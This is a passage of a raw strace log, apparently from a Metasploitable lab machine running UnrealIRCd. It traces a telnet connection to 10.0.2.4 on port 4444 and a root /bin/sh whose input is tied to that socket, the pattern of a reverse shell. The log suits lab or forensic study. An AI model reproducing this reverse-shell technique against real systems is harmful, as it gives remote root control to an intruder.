0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306e\374\267\264\25\376\267+F\321\267\344\274\271\277\211B\375\267+F\321\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0t\277\271\277\220\331\374\267!F\321\267R\203\346\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+F\321\267\0\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\210u\351\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0R\203\346\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306e\374\267\264\25\376\267r\241\322\267p\275\271\277\211B\375\267r\241\322\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0\0\300\271\277\220\331\374\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\241\322\267\0\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\340r\351\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\276\271\277\30\276\271\277|p\321\267\300\277\271\277\235\310\374\267Lp\321\267Fu\351\2670u\351\267H\203\346\267\370\275\271\277\211B\375\267H\203\346\267<u\351\267\364\17\376\267\340r\351\267\270}\346\267\210\300\271\277\220\331\374\267H\203\346\267R\203\346\267\374\34\0\0\374\34\0\0\0\0\0\0\5\0\0\0H\203\346\267\0@\0\0 \20\376\267|0\0\0\0\0\0\0008p\351\267\210u\351\267H\276\271\277\365\241\375\267\10\0\0\0hu\351\267R\203\346\267\224\276\271\277\237\1\375\267Fu\351\2670u\351\267\235N\347\267x\276\271\277\211B\375\267\235N\347\267<u\351\267\364\17\376\267\340r\351\267\270}\346\267\10\301\271\277\220\331\374\267\235N\347\267R\203\346\267\364\17\376\2670\276\271\277\210u\351\267\300\277\271\277\235N\347\267\7\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\230M\374\267\0\0\0\0\310\276\271\277\365\241\375\267\10\0\0\0\364\17\376\267R\203\346\267\340r\351\267\340\276\271\277\365\241\375\267`h\374\267\10\0\0\0 \20\376\267\0\276\271\2774\300\271\277\7\0\0\0\351\3\371\267\306e\374\267\264\25\376\267<\17\355\267\30\277\271\277\211B\375\267<\17\355\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0\250\301\271\277\220\331\374\267\26\17\355\267R\203\346\267\2\0\0\0X\300\271\0Lp\321\267|p\321\267<\17\355\267|0\0\0 \20\376\267\0\376\0\0\0\0\0\0\360J\374\267}\246\4\0\244\201\0\0\1\0\0\0\0\0\0\0\0\0\0\0R\203\346\267\364\17\376\267X\305\271\277\0\0\0\0\240\277\271\277G\34\375\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+F\321\267\0\0\0\0\1\0\0\0\0\0\0\0\340n\321\267\200\300\271\277\0066\375\267X\305\271\277\0\0\0\0\v\273\374\267\364\17\376\267{\305\271\277t\305\271\277p\305\271\277\300\25\376\267hu\351\267PH\374\267\0\0\0\0\0\0\0\0\364\17\376\267\360\33\375\267\340n\321\267\200\300\271\277\250\277\271\277\3515\375\267\0\0\0\0\364\17\376\267X\305\271\277\0\0\0\0,\300\271\277G\34\375\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\241\322\267\0\0\0\0\1\0\0\0\0\0\0\0\244-\346\267\f\301\271\277\0066\375\267X\305\271\277\0\0\0\0\1\1\1\0\0\0\0\0\301\240\375\267t\305\271\277p\305\271\277\300\25\376\2674\0\0\0L!\0\0\0\0\0\0\364\17\376\267\0\0\0\0\2\0\0\0\200\300\271\277\365\241\375\267\10\0\0\0\344x\351\267\340r\351\267\210\305\271\277y&\375\267\350x\351\267\344x\351\267\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340r\351\267\240\22\376\267\0\0\0\0\0\0\0\0\34\20\347\267\224\301\271\277\0066\375\267X\305\271\277\0\0\0\0\5\0\0\0\0\20\0\0{\305\271\277\301\240\375\267p\305\271\277\300\25\376\267\230\1\0\0\310\1\0\0\0\0\0\0\0\20\0\0\364\17\376\267\2\0\0\0l.\346\267\f\301\271\277\365\241\375\267\10\0\0\0\244x\351\267\230x\351\267\210\305\271\277\346\36\375\267\244x\351\267\230x\351\267\10\0\0\0\235N\347\267\0\0\0\0\1\0\0\0\0\0\0\0\240\22\376\267\0\0\0\0\0066\375\267X\305\271\277\0\0\0\0\6\0\0\0\4\0\0\0{\305\271\277t\305\271\277p\305\271\277\301\240\375\267@\1\0\0@\1\0\0\0\0\0\0\1\0\0\0\364\17\376\267\360\33\375\267\364\17\376\267\2\0\0\0\324\20\347\267\224\301\271\277\365\241\375\267\10\0\0\0\214x\351\267\200x\351\267\210\305\271\277\346\36\375\267\214x\351\267\200x\351\267\10\0\0\0\324\301\271\277G\34\375\267\340r\351\267\0\0\0\0\0\0\0\0\0\0\0\0<\17\355\267\0\0\0\0\1\0\0\0\0\0\0\0\340\301\271\277\0\0\0\0\364/\346\267\246\340\331\267\234\302\271\277\317\20\341\267\0\0\0\0\313\354\374\267", 4096}], msg_controllen=0, msg_flags=0}, 0) = 20
+29844 15:04:56.630078 close(7)          = 0
+29844 15:04:56.630098 fstat64(1, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+29844 15:04:56.630119 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc2000
+29844 15:04:56.630134 close(-1)         = -1 EBADF (Bad file descriptor)
+29844 15:04:56.630147 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 7
+29844 15:04:56.630162 setsockopt(7, SOL_IP, IP_TOS, [16], 4) = 0
+29844 15:04:56.630179 connect(7, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("10.0.2.4")}, 16) = 0
+29844 15:04:56.635356 open("/etc/telnetrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+29844 15:04:56.635395 open("(null)/.telnetrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+29844 15:04:56.635424 write(1, "Trying 10.0.2.4...\nConnected to 10.0.2.4.\nEscape character is \'^]\'.\n", 68) = 68
+29844 15:04:56.635443 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29844 15:04:56.635455 rt_sigaction(SIGINT, {0x804f550, [INT], SA_RESTART}, {SIG_IGN}, 8) = 0
+29844 15:04:56.635470 rt_sigaction(SIGQUIT, {0x804f500, [QUIT], SA_RESTART}, {SIG_IGN}, 8) = 0
+29844 15:04:56.635485 rt_sigaction(SIGWINCH, {0x804f4e0, [WINCH], SA_RESTART}, {SIG_IGN}, 8) = 0
+29844 15:04:56.635499 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART}, {0x8053270, [TSTP], SA_RESTART}, 8) = 0
+29844 15:04:56.635515 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb9c304) = -1 EINVAL (Invalid argument)
+29844 15:04:56.635527 ioctl(0, SNDCTL_TMR_STOP or TCSETSW, {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+29844 15:04:56.635542 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb9c304) = -1 EINVAL (Invalid argument)
+29844 15:04:56.635553 ioctl(0, SNDCTL_TMR_START or TCSETS, {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+29844 15:04:56.635566 ioctl(0, FIONBIO, [1]) = 0
+29844 15:04:56.635577 ioctl(1, FIONBIO, [1]) = 0
+29844 15:04:56.635587 ioctl(7, FIONBIO, [1]) = 0
+29844 15:04:56.635598 setsockopt(7, SOL_SOCKET, SO_OOBINLINE, [1], 4) = 0
+29844 15:04:56.635611 select(8, [0 7], [], [7], {0, 0}) = 0 (Timeout)
+29844 15:04:56.635627 select(8, [0 7], [], [7], NULL <unfinished ...>
+29842 15:04:56.655367 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+29842 15:04:56.655402 close(1)          = 0
+29842 15:04:56.655412 close(8)          = 0
+29842 15:04:56.655428 close(1)          = -1 EBADF (Bad file descriptor)
+29842 15:04:56.655439 close(8)          = -1 EBADF (Bad file descriptor)
+29842 15:04:56.655451 pipe([1, 8])      = 0
+29842 15:04:56.655477 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [CHLD], 8) = 0
+29842 15:04:56.655492 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcc6f8) = 29845
+29845 15:04:56.655549 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29845 15:04:56.655565 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29845 15:04:56.655578 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29845 15:04:56.655590 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29845 15:04:56.655613 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+29845 15:04:56.655629 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29845 15:04:56.655642 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29845 15:04:56.655657 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+29845 15:04:56.655669 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29845 15:04:56.655681 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+29845 15:04:56.655696 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29845 15:04:56.655708 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29845 15:04:56.655726 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29845 15:04:56.655739 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29845 15:04:56.655751 close(1)          = 0
+29845 15:04:56.655778 dup2(7, 0)        = 0
+29845 15:04:56.655788 close(7)          = 0
+29845 15:04:56.655797 dup2(8, 1)        = 1
+29845 15:04:56.655806 close(8)          = 0
+29845 15:04:56.655818 dup2(1, 2)        = 2
+29845 15:04:56.655831 fcntl64(1, F_GETFD) = 0
+29845 15:04:56.655890 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29845 15:04:56.655913 stat64("/sbin/sh", 0xbfedd728) = -1 ENOENT (No such file or directory)
+29845 15:04:56.655926 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29845 15:04:56.655945 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29845 15:04:56.655963 brk(0x8103000)    = 0x8103000
+29845 15:04:56.655982 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+29845 15:04:56.656003 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcc6f8) = 29846
+29846 15:04:56.656048 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.656064 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29846 15:04:56.656078 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29846 15:04:56.656090 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29846 15:04:56.656106 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29846 15:04:56.656122 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29846 15:04:56.656135 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29846 15:04:56.656170 execve("/bin/sh", ["sh"], [/* 14 vars */]) = 0
+29846 15:04:56.656247 brk(0)            = 0x80f9000
+29846 15:04:56.656267 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.656284 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f99000
+29846 15:04:56.656300 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.656318 open("/etc/ld.so.cache", O_RDONLY) = 7
+29846 15:04:56.656331 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29846 15:04:56.656349 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7f91000
+29846 15:04:56.656369 close(7)          = 0
+29846 15:04:56.656381 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.656398 open("/lib/libncurses.so.5", O_RDONLY) = 7
+29846 15:04:56.656412 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
+29846 15:04:56.656508 fstat64(7, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+29846 15:04:56.656526 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7f61000
+29846 15:04:56.656539 mmap2(0xb7f8e000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x2c) = 0xb7f8e000
+29846 15:04:56.656556 close(7)          = 0
+29846 15:04:56.656568 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.656583 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 7
+29846 15:04:56.656597 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
+29846 15:04:56.656692 fstat64(7, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+29846 15:04:56.656710 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7f5d000
+29846 15:04:56.656722 mmap2(0xb7f5f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x1) = 0xb7f5f000
+29846 15:04:56.656738 close(7)          = 0
+29846 15:04:56.656749 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.656764 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+29846 15:04:56.656778 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
+29846 15:04:56.656912 fstat64(7, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+29846 15:04:56.656930 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5c000
+29846 15:04:56.656945 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7e0d000
+29846 15:04:56.656957 mmap2(0xb7f56000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x149) = 0xb7f56000
+29846 15:04:56.656972 mmap2(0xb7f59000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f59000
+29846 15:04:56.656986 close(7)          = 0
+29846 15:04:56.657009 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e0c000
+29846 15:04:56.657021 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e0c6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+29846 15:04:56.657084 mprotect(0xb7f56000, 4096, PROT_READ) = 0
+29846 15:04:56.657121 munmap(0xb7f91000, 29913) = 0
+29846 15:04:56.657147 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29846 15:04:56.657161 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+29846 15:04:56.657181 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfced7b0) = -1 EINVAL (Invalid argument)
+29846 15:04:56.657206 brk(0)            = 0x80f9000
+29846 15:04:56.657216 brk(0x80fa000)    = 0x80fa000
+29846 15:04:56.657227 brk(0x80fb000)    = 0x80fb000
+29846 15:04:56.657243 getuid32()        = 0
+29846 15:04:56.657253 getgid32()        = 0
+29846 15:04:56.657263 geteuid32()       = 0
+29846 15:04:56.657272 getegid32()       = 0
+29846 15:04:56.657285 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29846 15:04:56.657299 time(NULL)        = 1495652696
+29846 15:04:56.657311 brk(0x80fc000)    = 0x80fc000
+29846 15:04:56.657323 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfced8b8) = -1 EINVAL (Invalid argument)
+29846 15:04:56.657337 brk(0x80fd000)    = 0x80fd000
+29846 15:04:56.657366 open("/proc/meminfo", O_RDONLY) = 7
+29846 15:04:56.657390 fstat64(7, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+29846 15:04:56.657409 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f98000
+29846 15:04:56.657424 read(7, "MemTotal:      1035240 kB\nMemFree:         52060 kB\nBuffers:        114568 kB\nCached:         393052 kB\nSwapCached:          0 kB\nActive:         439048 kB\nInactive:       401008 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:         51812 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            2368 kB\nWriteback:           0 kB\nAnonPages:      332528 kB\nMapped:          52112 kB\nSlab:            83596 kB\nSReclaimable:    21672 kB\nSUnreclaim:      61924 kB\nPageTables:      25384 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:  1111860 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
+29846 15:04:56.657512 close(7)          = 0
+29846 15:04:56.657524 munmap(0xb7f98000, 4096) = 0
+29846 15:04:56.657536 brk(0x80fe000)    = 0x80fe000
+29846 15:04:56.657564 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29846 15:04:56.657578 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29846 15:04:56.657590 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+29846 15:04:56.657603 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+29846 15:04:56.657615 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+29846 15:04:56.657627 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+29846 15:04:56.657642 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29846 15:04:56.657654 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29846 15:04:56.657667 uname({sys="Linux", node="metasploitable", ...}) = 0
+29846 15:04:56.657716 stat64("/etc/unreal", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29846 15:04:56.657735 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29846 15:04:56.657754 getpid()          = 29846
+29846 15:04:56.657770 getppid()         = 29845
+29846 15:04:56.657790 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29846 15:04:56.657810 stat64("/sbin/sh", 0xbfced788) = -1 ENOENT (No such file or directory)
+29846 15:04:56.657823 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29846 15:04:56.657841 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29846 15:04:56.657910 socket(PF_FILE, SOCK_STREAM, 0) = 7
+29846 15:04:56.657924 fcntl64(7, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+29846 15:04:56.657936 connect(7, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+29846 15:04:56.657959 close(7)          = 0
+29846 15:04:56.657971 socket(PF_FILE, SOCK_STREAM, 0) = 7
+29846 15:04:56.657981 fcntl64(7, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+29846 15:04:56.657992 connect(7, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+29846 15:04:56.658011 close(7)          = 0
+29846 15:04:56.658024 open("/etc/nsswitch.conf", O_RDONLY) = 7
+29846 15:04:56.658038 fstat64(7, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+29846 15:04:56.658056 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f98000
+29846 15:04:56.658067 read(7, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
+29846 15:04:56.658118 read(7, "", 4096) = 0
+29846 15:04:56.658128 close(7)          = 0
+29846 15:04:56.658137 munmap(0xb7f98000, 4096) = 0
+29846 15:04:56.658154 open("/etc/ld.so.cache", O_RDONLY) = 7
+29846 15:04:56.658167 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29846 15:04:56.658184 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7f91000
+29846 15:04:56.658198 close(7)          = 0
+29846 15:04:56.658209 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.658224 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 7
+29846 15:04:56.658240 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 